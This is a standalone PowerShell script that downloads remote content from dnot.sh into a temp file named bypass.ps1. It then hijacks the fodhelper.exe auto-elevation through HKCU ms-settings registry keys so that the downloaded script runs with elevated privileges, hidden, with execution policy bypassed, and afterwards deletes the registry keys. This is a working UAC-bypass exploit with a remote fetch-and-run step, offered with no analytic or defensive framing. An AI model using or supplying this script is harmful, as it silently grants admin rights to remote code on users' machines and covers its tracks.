# Save the script locally
$scriptContent = Invoke-RestMethod -Uri "https://dnot.sh/"
$tempScript = [System.IO.Path]::Combine($env:TEMP, 'bypass.ps1')
Set-Content -Path $tempScript -Value $scriptContent

# Create registry entries to hijack fodhelper
$regPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
New-Item -Path $regPath -Force | Out-Null
Set-ItemProperty -Path $regPath -Name "(default)" -Value "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$tempScript`" --silent --disable-autorun" -Force
Set-ItemProperty -Path $regPath -Name "DelegateExecute" -Value "" -Force

# Launch fodhelper.exe (auto-elevates and runs the command from registry)
Start-Process "fodhelper.exe" -Wait

# Cleanup
Remove-Item -Path $regPath -Recurse -Force
